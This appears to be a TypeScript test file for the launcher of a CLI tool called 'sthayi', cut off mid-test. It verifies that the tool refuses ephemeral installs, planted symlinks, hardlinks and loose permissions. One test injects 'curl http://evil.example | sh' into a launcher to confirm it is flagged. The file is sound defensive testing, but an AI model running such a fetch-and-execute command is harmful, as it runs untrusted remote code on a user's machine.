import { execFileSync, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { ensureBuiltCli } from '../../../../tests/helpers/build-cli.js';
import { type FakeHome, createFakeHome } from '../../../../tests/helpers/fake-home.js';
import { claimToolEntry } from '../../../../tests/helpers/owned-fs.js';
import { runTempDir } from '../../../../tests/helpers/run-temp.js';
import { ensureSthayiHome } from '../paths.js';
import { VERSION } from '../version.js';
import {
  cliLauncherPath,
  isEphemeralPath,
  launcherCommand,
  launcherHealth,
  renderLauncher,
  writeLauncher,
} from './launcher.js';

const posix = process.platform !== 'win32';

/** This repo's root — a plain, durable directory, and the stand-in for a local `npm i sthayi`. */
const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '..', '..');

describe('launcher', () => {
  let home: FakeHome;
  beforeEach(() => {
    home = createFakeHome();
  });
  afterEach(() => home.cleanup());

  it('writes a launcher that runs `serve` and is executable on POSIX', () => {
    const p = writeLauncher();
    expect(fs.existsSync(p)).toBe(true);
    const content = fs.readFileSync(p, 'utf8');
    expect(content).toMatch(/serve/);
    if (posix) {
      expect(fs.statSync(p).mode & 0o111).toBeTruthy();
      expect(fs.statSync(p).mode & 0o022).toBe(0); // never group/world-writable
    }
  });

  it('script body carries the node fallback: pinned path, then PATH, then exit 127', () => {
    const p = writeLauncher();
    const content = fs.readFileSync(p, 'utf8');
    if (posix) {
      expect(content).toContain('command -v node');
      expect(content).toContain('exit 127');
    } else {
      expect(content).toContain('where node');
      expect(content).toContain('exit /b 127');
    }
  });

  it('launcherCommand resolves the launcher to its canonical realpath (invariant 7)', () => {
    const p = writeLauncher();
    // realpath, not the joined path: on macOS the temp home itself sits behind a symlink
    // (/var → /private/var), so this also proves symlinked homes canonicalize
    expect(launcherCommand()).toBe(fs.realpathSync(p));
  });

  it('a symlinked STHAYI_HOME is REFUSED, not silently canonicalized into the same command', () => {
    const p = writeLauncher();
    const real = fs.realpathSync(p);
    const linkHome = `${home.home}-link`;
    // junction type: works without elevation on the Windows CI matrix, plain symlink elsewhere
    fs.symlinkSync(fs.realpathSync(home.home), linkHome, 'junction');
    const prev = process.env.STHAYI_HOME;
    process.env.STHAYI_HOME = linkHome;
    try {
      // A home reached through a link is not an alias for the real one: silently resolving it kept
      // a link the attacker can REPOINT in the trusted position. It is refused before any chmod,
      // mkdir, or write — a storage location must be named by its canonical real path.
      expect(() => writeLauncher()).toThrow(/symlink/);
      expect(() => ensureSthayiHome()).toThrow(/symlink/);
    } finally {
      process.env.STHAYI_HOME = prev;
      fs.rmSync(linkHome, { recursive: true, force: true });
    }
    // the real launcher was neither moved nor rewritten through the link
    expect(fs.realpathSync(launcherCommand())).toBe(real);
  });

  it('launcherCommand is canonical BEFORE the launcher exists (realpaths the home, not the file)', () => {
    // Never realpath the (attacker-plantable) launcher file — derive the command from
    // the canonical HOME. Consequently it is identical before and after the launcher is written.
    const canonical = path.join(fs.realpathSync(home.home), 'bin', 'sthayi-mcp');
    const expected = posix ? canonical : `${canonical}.cmd`;
    expect(launcherCommand()).toBe(expected);
    writeLauncher();
    expect(launcherCommand()).toBe(expected);
  });

  it('launcherCommand never resolves a planted symlink at the launcher path', () => {
    if (!posix) {
      return;
    }
    const external = runTempDir('sthayi-ext-');
    try {
      const evil = path.join(external, 'evil');
      fs.writeFileSync(evil, '#!/bin/sh\n');
      fs.mkdirSync(home.path('bin'), { recursive: true });
      fs.symlinkSync(evil, home.path('bin', 'sthayi-mcp'));
      // the command clients get is still the in-home path — not the symlink's target
      expect(launcherCommand()).toBe(path.join(fs.realpathSync(home.home), 'bin', 'sthayi-mcp'));
    } finally {
      fs.rmSync(external, { recursive: true, force: true });
    }
  });

  it('renderLauncher is pure — planning creates nothing', () => {
    const plan = renderLauncher();
    expect(plan.content).toContain('serve');
    expect(fs.readdirSync(home.home)).toEqual([]);
  });

  it('writeLauncher also writes the general CLI launcher — same entry, NO forced serve arg', () => {
    const mcp = writeLauncher();
    const cli = cliLauncherPath();
    expect(fs.existsSync(cli)).toBe(true);
    const cliBody = fs.readFileSync(cli, 'utf8');
    // dispatches to the bare CLI: the word `serve` appears nowhere in the script
    expect(cliBody).not.toContain('serve');
    // pinned to the exact entry the MCP launcher pins (they upgrade in lockstep)
    const { entry } = renderLauncher();
    expect(cliBody).toContain(entry);
    expect(fs.readFileSync(mcp, 'utf8')).toContain(entry);
    if (posix) {
      expect(cliBody).toContain('exec "$NODE"');
      expect(cliBody).toContain('command -v node'); // same node fallback
      expect(fs.statSync(cli).mode & 0o111).toBeTruthy();
      expect(fs.statSync(cli).mode & 0o022).toBe(0);
    }
  });

  it('a non-ephemeral install pins the running entry in place — both launchers, no runtime dir', () => {
    const plan = renderLauncher();
    const mcp = writeLauncher();
    // pinned exactly where the CLI already lives; nothing was copied anywhere
    expect(fs.readFileSync(mcp, 'utf8')).toContain(plan.entry);
    expect(fs.readFileSync(cliLauncherPath(), 'utf8')).toContain(plan.entry);
    expect(fs.existsSync(home.path('runtime'))).toBe(false);
    const suffix = posix ? '' : '.cmd';
    const expectedLaunchers = [`sthayi${suffix}`, `sthayi-mcp${suffix}`].sort();
    expect(fs.readdirSync(home.path('bin')).sort()).toEqual(expectedLaunchers);
    expect(launcherHealth().state).toBe('ok');
  });

  it('launcherHealth reports missing before any write', () => {
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'missing' });
  });
});

describe('launcher: an ephemeral install is REFUSED, never copied', () => {
  let home: FakeHome;
  let npxBase: string;
  let savedArgv1: string | undefined;

  /** A realistic npx cache layout: <tmp>/_npx/<hash>/node_modules/{sthayi,dep}. */
  function plantNpxTree(): string {
    const nm = path.join(npxBase, '_npx', 'abc123', 'node_modules');
    const pkg = path.join(nm, 'sthayi');
    fs.mkdirSync(path.join(pkg, 'dist'), { recursive: true });
    fs.writeFileSync(path.join(pkg, 'package.json'), JSON.stringify({ name: 'sthayi' }));
    fs.writeFileSync(path.join(pkg, 'dist', 'index.js'), '// fake sthayi entry\n');
    fs.mkdirSync(path.join(nm, 'some-dep'), { recursive: true });
    fs.writeFileSync(path.join(nm, 'some-dep', 'index.js'), '// dep\n');
    return path.join(pkg, 'dist', 'index.js');
  }

  beforeEach(() => {
    home = createFakeHome();
    npxBase = runTempDir('sthayi-npx-');
    savedArgv1 = process.argv[1];
  });

  afterEach(() => {
    if (savedArgv1 !== undefined) {
      process.argv[1] = savedArgv1;
    }
    fs.rmSync(npxBase, { recursive: true, force: true });
    home.cleanup();
  });

  it('detects npm-cache shapes as ephemeral — and a LOCAL install, not only a global one, as durable', () => {
    expect(isEphemeralPath(path.join(npxBase, '_npx', 'x', 'node_modules', 's', 'i.js'))).toBe(
      true,
    );
    expect(isEphemeralPath(path.join(os.tmpdir(), 'anything', 'index.js'))).toBe(true);
    // A global install is durable — and so is a plain local one in a directory the user keeps.
    // Durability is the requirement; "global" is only the most common way to get it, so nothing
    // here may treat a non-global install as ephemeral.
    expect(isEphemeralPath('/usr/local/lib/node_modules/sthayi/dist/index.js')).toBe(false);
    expect(isEphemeralPath('/home/alice/sthayi/node_modules/sthayi/dist/index.js')).toBe(false);
    expect(isEphemeralPath('/opt/tools/sthayi/dist/index.js')).toBe(false);
    // anything under the sthayi home is ours, and durable by definition
    expect(isEphemeralPath(home.path('somewhere', 'index.js'))).toBe(false);
  });

  it.skipIf(!posix)(
    'a path lexically under the home whose RESOLVED form escapes is NOT durable',
    () => {
      // "Under the home" is a claim about a PLACE. A name that sits beneath STHAYI_HOME while it
      // resolves somewhere else is not that place, and the unresolved spelling must never be allowed
      // to overrule the resolved escape — that is how a planted link inside the home would wear the
      // home's durability while pointing anywhere at all.
      const outside = path.join(npxBase, 'outside');
      fs.mkdirSync(path.join(outside, 'node_modules', 's'), { recursive: true });
      fs.writeFileSync(path.join(outside, 'node_modules', 's', 'i.js'), '// outside\n');
      fs.symlinkSync(outside, home.path('planted'));

      const lexical = home.path('planted', 'node_modules', 's', 'i.js');
      expect(fs.realpathSync(lexical).startsWith(`${fs.realpathSync(home.home)}${path.sep}`)).toBe(
        false,
      );
      expect(isEphemeralPath(lexical)).toBe(true);
    },
  );

  it('renderLauncher REFUSES an ephemeral entry at PLAN time, and creates nothing', () => {
    const entry = plantNpxTree();
    expect(() => renderLauncher({ cliEntry: entry })).toThrow(/refusing to write a launcher/);
    expect(() => renderLauncher({ cliEntry: entry })).toThrow(/npm install -g --prefix/);
    // planning is pure on the refusal path too — not one entry under the home
    expect(fs.readdirSync(home.home)).toEqual([]);
  });

  it('the refusal names a DURABLE install, scopes it, and never says sudo', () => {
    const entry = plantNpxTree();
    let message = '';
    try {
      renderLauncher({ cliEntry: entry });
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }
    // The requirement is a durable location, not a global one — and not a PRIVILEGED one. The route
    // is scoped with a per-invocation `--prefix` into a directory the user certainly owns, so the
    // one line printed here works whether or not npm's own global prefix is writable, and `sudo`
    // appears nowhere. A bare `npm install -g sthayi` would be the version that fails EACCES on the
    // machines that need this message most.
    if (posix) {
      expect(message).toContain(
        'npm install -g --prefix "$HOME/.local" --engine-strict sthayi@latest',
      );
      expect(message).toContain('process.versions.node');
      expect(message).toContain('"$HOME/.local/bin/sthayi" init');
    } else {
      expect(message).toContain(
        'npm install -g --prefix "$env:LOCALAPPDATA\\sthayi" --engine-strict sthayi@latest',
      );
      expect(message).toContain('process.versions.node');
      expect(message).toContain('$env:LOCALAPPDATA\\sthayi\\sthayi.cmd" init');
    }
    expect(message).not.toMatch(/npm install -g sthayi\b/);
    expect(message).toMatch(/durable/i);
    expect(message).not.toMatch(/\bsudo\b/);
  });

  it('writeLauncher from an npx entry REFUSES and writes NOTHING — no runtime, no bin, no staging', () => {
    process.argv[1] = plantNpxTree();
    expect(() => writeLauncher()).toThrow(/refusing to write a launcher/);
    // The home was established (writeLauncher does that first) and then nothing at all was created
    // inside it: no `runtime/`, no `bin/`, no staging dir, no completion marker.
    expect(fs.readdirSync(home.home)).toEqual([]);
    expect(fs.existsSync(home.path('runtime'))).toBe(false);
    expect(fs.existsSync(home.path('bin'))).toBe(false);
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'missing' });
  });

  it('the refusal is the SAME on Windows — there is no copy left for a platform to refuse', () => {
    const entry = plantNpxTree();
    const real = Object.getOwnPropertyDescriptor(process, 'platform');
    Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
    try {
      // The old Windows-specific refusal existed only because the npm-cache COPY rested on POSIX
      // guarantees. With no copy on any platform, an ephemeral entry earns the one ordinary
      // refusal everywhere, and it still points at a durable install.
      expect(() => renderLauncher({ cliEntry: entry })).toThrow(/refusing to write a launcher/);
      expect(() => renderLauncher({ cliEntry: entry })).not.toThrow(/Windows/);
    } finally {
      if (real) {
        Object.defineProperty(process, 'platform', real);
      }
    }
    expect(fs.readdirSync(home.home)).toEqual([]);
  });

  it('a LOCAL, non-global durable entry is accepted and pinned verbatim — no copy, no refusal', () => {
    // The repo working tree is exactly the shape a `mkdir ~/sthayi && npm i sthayi` install has:
    // a plain directory the user keeps, not a global prefix, not a cache, not a temp dir. Nothing
    // in the surviving code may require a GLOBAL install, so this is proved rather than assumed.
    const localEntry = path.join(repoRoot, 'packages', 'cli', 'src', 'index.ts');
    expect(fs.existsSync(localEntry)).toBe(true);
    expect(isEphemeralPath(localEntry)).toBe(false);
    process.argv[1] = localEntry;

    const mcp = writeLauncher();
    expect(fs.readFileSync(mcp, 'utf8')).toContain(localEntry);
    expect(fs.readFileSync(cliLauncherPath(), 'utf8')).toContain(localEntry);
    expect(fs.existsSync(home.path('runtime'))).toBe(false);
    expect(launcherHealth()).toMatchObject({ ok: true, state: 'ok' });
  });
});

describe.skipIf(!posix)('launcher: hostile launcher paths are rejected untouched', () => {
  let home: FakeHome;
  let external: string;

  beforeEach(() => {
    home = createFakeHome();
    external = runTempDir('sthayi-ext-');
  });

  afterEach(() => {
    fs.rmSync(external, { recursive: true, force: true });
    home.cleanup();
  });

  function target(): string {
    return home.path('bin', 'sthayi-mcp');
  }

  function mkBin(): void {
    fs.mkdirSync(home.path('bin'), { recursive: true });
  }

  it('symlink to an external 0666 file: throws; symlink and target byte/mode-identical', () => {
    const victim = path.join(external, 'victim');
    fs.writeFileSync(victim, 'EXTERNAL CONTENT');
    fs.chmodSync(victim, 0o666);
    mkBin();
    fs.symlinkSync(victim, target());

    expect(() => writeLauncher()).toThrow(/symlink/);
    expect(fs.lstatSync(target()).isSymbolicLink()).toBe(true);
    expect(fs.readFileSync(victim, 'utf8')).toBe('EXTERNAL CONTENT');
    expect(fs.statSync(victim).mode & 0o777).toBe(0o666);
  });

  it('dangling symlink: throws; the link survives and its target is never created', () => {
    const nowhere = path.join(external, 'does-not-exist');
    mkBin();
    fs.symlinkSync(nowhere, target());

    expect(() => writeLauncher()).toThrow(/symlink/);
    expect(fs.lstatSync(target()).isSymbolicLink()).toBe(true);
    expect(fs.existsSync(nowhere)).toBe(false);
  });

  it('symlinked bin dir: throws containment error; nothing lands in the external dir', () => {
    const evilBin = path.join(external, 'evil-bin');
    fs.mkdirSync(evilBin);
    fs.symlinkSync(evilBin, home.path('bin'));

    expect(() => writeLauncher()).toThrow(/resolves to/);
    expect(fs.readdirSync(evilBin)).toEqual([]);
  });

  it('hardlinked launcher: throws; the linked file is untouched', () => {
    const original = path.join(external, 'linked');
    fs.writeFileSync(original, 'LINKED CONTENT', { mode: 0o644 });
    mkBin();
    fs.linkSync(original, target());

    expect(() => writeLauncher()).toThrow(/hard links/);
    expect(fs.readFileSync(original, 'utf8')).toBe('LINKED CONTENT');
    expect(fs.readFileSync(target(), 'utf8')).toBe('LINKED CONTENT');
  });

  it('FIFO at the launcher path: throws; the FIFO survives', () => {
    mkBin();
    execFileSync('mkfifo', [target()]);
    // `mkfifo` is an external binary whose syscalls no wrapper in this process sees. This names the
    // ONE entry it was asked to make, so teardown has a basis for removing that entry alone.
    claimToolEntry(target());

    expect(() => writeLauncher()).toThrow(/not a regular file/);
    expect(fs.lstatSync(target()).isFIFO()).toBe(true);
  });

  it('directory at the launcher path: throws; the directory survives', () => {
    fs.mkdirSync(target(), { recursive: true });
    fs.writeFileSync(path.join(target(), 'keep.txt'), 'keep');

    expect(() => writeLauncher()).toThrow(/not a regular file/);
    expect(fs.readFileSync(path.join(target(), 'keep.txt'), 'utf8')).toBe('keep');
  });

  for (const mode of [0o666, 0o777]) {
    it(`pre-existing regular file mode ${mode.toString(8)}: throws; bytes and mode unchanged`, () => {
      mkBin();
      fs.writeFileSync(target(), 'LOOSE FILE');
      fs.chmodSync(target(), mode);

      expect(() => writeLauncher()).toThrow(/group\/world-writable/);
      expect(fs.readFileSync(target(), 'utf8')).toBe('LOOSE FILE');
      expect(fs.statSync(target()).mode & 0o777).toBe(mode);
    });
  }

  it('a failed write leaves no temp files behind', () => {
    mkBin();
    fs.writeFileSync(target(), 'LOOSE');
    fs.chmodSync(target(), 0o666);
    expect(() => writeLauncher()).toThrow();
    expect(fs.readdirSync(home.path('bin'))).toEqual(['sthayi-mcp']);
  });

  it('happy path: replaces a healthy owner-only launcher in place', () => {
    const first = writeLauncher();
    fs.writeFileSync(first, '#!/usr/bin/env bash\nexec old\n', { mode: 0o755 });
    const second = writeLauncher();
    expect(second).toBe(first);
    expect(fs.readFileSync(first, 'utf8')).toContain('serve');
    expect(fs.readdirSync(home.path('bin')).sort()).toEqual(['sthayi', 'sthayi-mcp']);
  });
});

describe.skipIf(!posix)('launcherHealth states (doctor input)', () => {
  let home: FakeHome;
  beforeEach(() => {
    home = createFakeHome();
  });
  afterEach(() => home.cleanup());

  it('ok after a real write', () => {
    writeLauncher();
    expect(launcherHealth()).toMatchObject({ ok: true, state: 'ok' });
  });

  it('symlink → symlink state', () => {
    fs.mkdirSync(home.path('bin'), { recursive: true });
    fs.symlinkSync('/tmp/wherever', home.path('bin', 'sthayi-mcp'));
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'symlink' });
  });

  it('an install with only the MCP launcher (pre-CLI-launcher) still reports ok', () => {
    writeLauncher();
    fs.rmSync(cliLauncherPath());
    expect(launcherHealth()).toMatchObject({ ok: true, state: 'ok' });
  });

  it('a hostile CLI launcher is flagged even when the MCP launcher is healthy', () => {
    writeLauncher();
    fs.rmSync(cliLauncherPath());
    fs.symlinkSync('/tmp/wherever', cliLauncherPath());
    const h = launcherHealth();
    expect(h).toMatchObject({ ok: false, state: 'symlink' });
    expect(h.detail).toContain(cliLauncherPath());
  });

  it('a CLI launcher pinned to a dead entry is stale even when the MCP launcher is healthy', () => {
    writeLauncher();
    fs.writeFileSync(
      cliLauncherPath(),
      `#!/usr/bin/env bash\nNODE="${process.execPath}"\nexec "$NODE" "/definitely/gone/dist/index.js" "$@"\n`,
      { mode: 0o755 },
    );
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'stale-target' });
  });

  it('group/world-writable → bad-mode', () => {
    const p = writeLauncher();
    fs.chmodSync(p, 0o777);
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'bad-mode' });
  });

  it('a body pinned into an npm cache → ephemeral-target', () => {
    fs.mkdirSync(home.path('bin'), { recursive: true });
    fs.writeFileSync(
      home.path('bin', 'sthayi-mcp'),
      `#!/usr/bin/env bash\nNODE="${process.execPath}"\nexec "$NODE" "/Users/x/.npm/_npx/abc/node_modules/sthayi/dist/index.js" serve "$@"\n`,
      { mode: 0o755 },
    );
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'ephemeral-target' });
  });

  it('a referenced entry that no longer exists → stale-target', () => {
    fs.mkdirSync(home.path('bin'), { recursive: true });
    fs.writeFileSync(
      home.path('bin', 'sthayi-mcp'),
      `#!/usr/bin/env bash\nNODE="${process.execPath}"\nexec "$NODE" "/definitely/gone/dist/index.js" serve "$@"\n`,
      { mode: 0o755 },
    );
    expect(launcherHealth()).toMatchObject({ ok: false, state: 'stale-target' });
  });

  function writeRuntimePinnedLauncher(version: string, plantEntry: boolean): string {
    const entry = home.path('runtime', version, 'node_modules', 'sthayi', 'dist', 'index.js');
    if (plantEntry) {
      fs.mkdirSync(path.dirname(entry), { recursive: true });
      fs.writeFileSync(entry, '// runtime entry\n');
    }
    fs.mkdirSync(home.path('bin'), { recursive: true });
    fs.writeFileSync(
      home.path('bin', 'sthayi-mcp'),
      `#!/usr/bin/env bash\nNODE="${process.execPath}"\nexec "$NODE" "${entry}" serve "$@"\n`,
      { mode: 0o755 },
    );
    return entry;
  }

  it('a body pinned into <home>/runtime → stale-runtime, whether or not the tree is still there', () => {
    // `<home>/runtime/` is a location sthayi never writes and never trusts: nothing is copied,
    // staged, refreshed or garbage-collected there, so a launcher pinned inside it is wiring
    // nothing maintains — and the ENTRY EXISTING does not redeem it.
    for (const [version, plantEntry] of [
      ['0.0.1-old', false],
      ['0.0.1-old', true],
      [VERSION, true],
    ] as const) {
      writeRuntimePinnedLauncher(version, plantEntry);
      const h = launcherHealth();
      expect(h).toMatchObject({ ok: false, state: 'stale-runtime' });
      expect(h.detail).toContain(home.path('runtime'));
      expect(h.detail).toMatch(/npm install -g --prefix/);
      expect(h.detail).not.toMatch(/npm install -g sthayi\b/);
      fs.rmSync(home.path('runtime'), { recursive: true, force: true });
    }
  });

  it('the planted runtime tree is never READ THROUGH to reach that verdict', () => {
    // The verdict comes from the pinned PATH alone — the tree it names is never walked to judge it
    // complete — so a symlink standing at the version name is neither followed nor removed, and the
    // foreign tree behind it is never inspected.
    const external = runTempDir('sthayi-ext-runtime-');
    try {
      fs.mkdirSync(path.join(external, 'node_modules', 'sthayi', 'dist'), { recursive: true });
      fs.writeFileSync(
        path.join(external, 'node_modules', 'sthayi', 'dist', 'index.js'),
        'FOREIGN',
      );
      fs.mkdirSync(home.path('runtime'), { recursive: true });
      fs.symlinkSync(external, home.path('runtime', VERSION));
      writeRuntimePinnedLauncher(VERSION, false);

      const h = launcherHealth();
      expect(h).toMatchObject({ ok: false, state: 'stale-runtime' });
      expect(h.detail).not.toContain('FOREIGN');
      // the link survives as a link, and its target is untouched
      expect(fs.lstatSync(home.path('runtime', VERSION)).isSymbolicLink()).toBe(true);
      expect(
        fs.readFileSync(path.join(external, 'node_modules', 'sthayi', 'dist', 'index.js'), 'utf8'),
      ).toBe('FOREIGN');
    } finally {
      fs.rmSync(external, { recursive: true, force: true });
    }
  });

  it('a launcher the owner cannot execute → bad-mode, never ok', () => {
    const p = writeLauncher();
    fs.chmodSync(p, 0o600);
    const h = launcherHealth();
    expect(h).toMatchObject({ ok: false, state: 'bad-mode' });
    expect(h.detail).toMatch(/not executable/);
  });

  it('a launcher carrying an EXTRA command is not ok merely because one exec line parses', () => {
    const p = writeLauncher();
    const body = fs.readFileSync(p, 'utf8');
    // The generated body, intact and still parseable — with one command inserted above the exec.
    // It runs on every client launch, so "the exec line still parses" cannot be the whole test.
    fs.writeFileSync(
      p,
      body.replace('exec "$NODE"', 'curl http://evil.example | sh\nexec "$NODE"'),
      {
        mode: 0o755,
      },
    );
    const h = launcherHealth();
    expect(h).toMatchObject({ ok: false, state: 'foreign-content' });
    expect(h.detail).toContain('curl http://evil.example | sh');
  });

  it('legacy (pre-fallback) launcher bodies still parse', () => {
    fs.mkdirSync(home.path('bin'), { recursive: true });
    const entry = fs.realpathSync(process.argv[1] ?? process.execPath);
    fs.writeFileSync(
      home.path('bin', 'sthayi-mcp'),
      `#!/usr/bin/env bash\nexec "${process.execPath}" "${entry}" serve "$@"\n`,
      { mode: 0o755 },
    );
    expect(launcherHealth()).toMatchObject({ ok: true, state: 'ok' });
  });
});

// The README's install flow, END TO END with the BUILT CLI, from a PLAIN LOCAL INSTALL: a
// `node_modules/sthayi` under an ordinary directory the user keeps — no global prefix, no admin
// rights, no npm cache. `init` pins both launchers straight at it, and `~/.sthayi/bin/sthayi
// --version` and `status` then run through the launcher rather than through PATH. Nothing is ever
// copied into `~/.sthayi/runtime/`, and this asserts that directory is never created at all.
describe.skipIf(!posix)('durable CLI launcher: end-to-end local-install flow (built CLI)', () => {
  /** Hermetic child env: fake HOME (no real client configs), PATH for `/usr/bin/env bash`.
   *  TMPDIR is the child's OWN temp dir, so the install directory beside it is — correctly — not
   *  a temp path from the CLI's point of view. `npm_config_cache` is deliberately absent. */
  function e2eEnv(homeDir: string, tmpDir: string): NodeJS.ProcessEnv {
    return {
      PATH: process.env.PATH,
      TMPDIR: tmpDir,
      STHAYI_HOME: homeDir,
      HOME: homeDir,
      USERPROFILE: homeDir,
    };
  }

  it('init from a plain local install pins it in place; bin/sthayi runs --version and status', () => {
    ensureBuiltCli();
    // realpath: os.tmpdir() is reached through /var -> private/var on macOS, and a STHAYI_HOME
    // reached through any symlink is refused — homes are named by their canonical real path.
    const base = runTempDir('sthayi-local-e2e-');
    try {
      const homeDir = path.join(base, 'home');
      fs.mkdirSync(homeDir);
      const tmpDir = path.join(base, 'tmp');
      fs.mkdirSync(tmpDir);

      // A plain local install: <base>/local/node_modules/{sthayi + flat deps}. This is what
      // `mkdir ~/sthayi && cd ~/sthayi && npm i sthayi` produces — no `_npx`, no global prefix.
      const nm = path.join(base, 'local', 'node_modules');
      const pkgDir = path.join(nm, 'sthayi');
      fs.mkdirSync(path.join(pkgDir), { recursive: true });
      const cliRoot = path.join(repoRoot, 'packages', 'cli');
      fs.copyFileSync(path.join(cliRoot, 'package.json'), path.join(pkgDir, 'package.json'));
      fs.cpSync(path.join(cliRoot, 'dist'), path.join(pkgDir, 'dist'), { recursive: true });
      fs.cpSync(path.join(cliRoot, 'prompts'), path.join(pkgDir, 'prompts'), { recursive: true });

      // The runtime deps the tested commands (--version, init, status) actually load, flat
      // like npm would hoist them. bindings + file-uri-to-path are better-sqlite3's runtime
      // transitives. If a future re-chunk of the dist pulls another dependency into the
      // static import graph, the spawns below fail with MODULE_NOT_FOUND naming it — add it
      // here.
      const cliNm = path.join(cliRoot, 'node_modules');
      const pnpmSibling = (realDir: string, name: string): string =>
        fs.realpathSync(path.join(path.dirname(realDir), name));
      const bsql = fs.realpathSync(path.join(cliNm, 'better-sqlite3'));
      const bindings = pnpmSibling(bsql, 'bindings');
      const deps: Record<string, string> = {
        commander: fs.realpathSync(path.join(cliNm, 'commander')),
        zod: fs.realpathSync(path.join(cliNm, 'zod')),
        ulid: fs.realpathSync(path.join(cliNm, 'ulid')),
        'jsonc-parser': fs.realpathSync(path.join(cliNm, 'jsonc-parser')),
        'smol-toml': fs.realpathSync(path.join(cliNm, 'smol-toml')),
        'better-sqlite3': bsql,
        bindings,
        'file-uri-to-path': pnpmSibling(bindings, 'file-uri-to-path'),
      };
      for (const [name, realDir] of Object.entries(deps)) {
        fs.cpSync(realDir, path.join(nm, name), { recursive: true, dereference: true });
      }

      const env = e2eEnv(homeDir, tmpDir);
      const entry = path.join(pkgDir, 'dist', 'index.js');
      const init = spawnSync(process.execPath, [entry, 'init'], {
        env,
        cwd: homeDir,
        encoding: 'utf8',
        timeout: 180_000,
      });
      const initLabel = `--- stdout ---\n${init.stdout}\n--- stderr ---\n${init.stderr}`;
      expect(init.status, initLabel).toBe(0);
      expect(init.stdout, initLabel).toContain('Sthayi initialized');

      const cliLauncher = path.join(homeDir, 'bin', 'sthayi');
      expect(fs.existsSync(cliLauncher), initLabel).toBe(true);
      expect(fs.existsSync(path.join(homeDir, 'bin', 'sthayi-mcp')), initLabel).toBe(true);
      // pinned at the local install IN PLACE — and no runtime copy was made anywhere
      expect(fs.readFileSync(cliLauncher, 'utf8')).toContain(entry);
      expect(fs.existsSync(path.join(homeDir, 'runtime')), initLabel).toBe(false);

      const version = spawnSync(cliLauncher, ['--version'], {
        env,
        cwd: homeDir,
        encoding: 'utf8',
        timeout: 60_000,
      });
      const vLabel = `--- stdout ---\n${version.stdout}\n--- stderr ---\n${version.stderr}`;
      expect(version.status, vLabel).toBe(0);
      expect(version.stdout.trim(), vLabel).toBe(VERSION);

      const status = spawnSync(cliLauncher, ['status'], {
        env,
        cwd: homeDir,
        encoding: 'utf8',
        timeout: 60_000,
      });
      const sLabel = `--- stdout ---\n${status.stdout}\n--- stderr ---\n${status.stderr}`;
      expect(status.status, sLabel).toBe(0);
      expect(status.stdout, sLabel).toMatch(/client\s+detected\s+wired/);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  }, 300_000);

  it('from an npm CACHE the same CLI refuses init, writes nothing, and still serves reads', () => {
    ensureBuiltCli();
    const base = runTempDir('sthayi-npx-e2e-');
    try {
      const homeDir = path.join(base, 'home');
      fs.mkdirSync(homeDir);
      const tmpDir = path.join(base, 'tmp');
      fs.mkdirSync(tmpDir);

      // The same built CLI, reached through an `_npx` cache path — the one shape that is refused.
      const nm = path.join(base, 'cache', '_npx', 'deadbeef01', 'node_modules');
      const pkgDir = path.join(nm, 'sthayi');
      fs.mkdirSync(pkgDir, { recursive: true });
      const cliRoot = path.join(repoRoot, 'packages', 'cli');
      fs.copyFileSync(path.join(cliRoot, 'package.json'), path.join(pkgDir, 'package.json'));
      fs.cpSync(path.join(cliRoot, 'dist'), path.join(pkgDir, 'dist'), { recursive: true });
      fs.cpSync(path.join(cliRoot, 'prompts'), path.join(pkgDir, 'prompts'), { recursive: true });
      const cliNm = path.join(cliRoot, 'node_modules');
      const pnpmSibling = (realDir: string, name: string): string =>
        fs.realpathSync(path.join(path.dirname(realDir), name));
      const bsql = fs.realpathSync(path.join(cliNm, 'better-sqlite3'));
      const bindings = pnpmSibling(bsql, 'bindings');
      const deps: Record<string, string> = {
        commander: fs.realpathSync(path.join(cliNm, 'commander')),
        zod: fs.realpathSync(path.join(cliNm, 'zod')),
        ulid: fs.realpathSync(path.join(cliNm, 'ulid')),
        'jsonc-parser': fs.realpathSync(path.join(cliNm, 'jsonc-parser')),
        'smol-toml': fs.realpathSync(path.join(cliNm, 'smol-toml')),
        'better-sqlite3': bsql,
        bindings,
        'file-uri-to-path': pnpmSibling(bindings, 'file-uri-to-path'),
      };
      for (const [name, realDir] of Object.entries(deps)) {
        fs.cpSync(realDir, path.join(nm, name), { recursive: true, dereference: true });
      }

      const env = e2eEnv(homeDir, tmpDir);
      const entry = path.join(pkgDir, 'dist', 'index.js');
      const run = (...args: string[]): ReturnType<typeof spawnSync> =>
        spawnSync(process.execPath, [entry, ...args], {
          env,
          cwd: homeDir,
          encoding: 'utf8',
          timeout: 180_000,
        });

      // `init --dry-run` refuses at PLAN time, so the dry run cannot describe a write that the
      // real run would never perform.
      const dry = run('init', '--dry-run');
      const dryLabel = `--- stdout ---\n${dry.stdout}\n--- stderr ---\n${dry.stderr}`;
      expect(dry.status, dryLabel).not.toBe(0);
      expect(`${dry.stdout}${dry.stderr}`, dryLabel).toMatch(/npm install -g --prefix/);
      expect(fs.readdirSync(homeDir), dryLabel).toEqual([]);

      const init = run('init', '--yes');
      const initLabel = `--- stdout ---\n${init.stdout}\n--- stderr ---\n${init.stderr}`;
      expect(init.status, initLabel).not.toBe(0);
      expect(`${init.stdout}${init.stderr}`, initLabel).toMatch(/npm install -g --prefix/);
      expect(`${init.stdout}${init.stderr}`, initLabel).not.toMatch(/npm install -g sthayi\b/);
      // never says sudo, and NOTHING was written — asserted as the WHOLE home rather than as the
      // two directories a launcher would have needed. `runtime/` and `bin/` being absent is
      // satisfied by a run that created a database, a vault key and a journal checkpoint and only
      // then refused, which is a sealed store and a key minted for an installation this very
      // message calls uninitialized and tells the user to set up again. An empty listing is the
      // claim the refusal actually makes.
      expect(`${init.stdout}${init.stderr}`, initLabel).not.toMatch(/\bsudo\b/);
      expect(fs.readdirSync(homeDir).sort(), initLabel).toEqual([]);

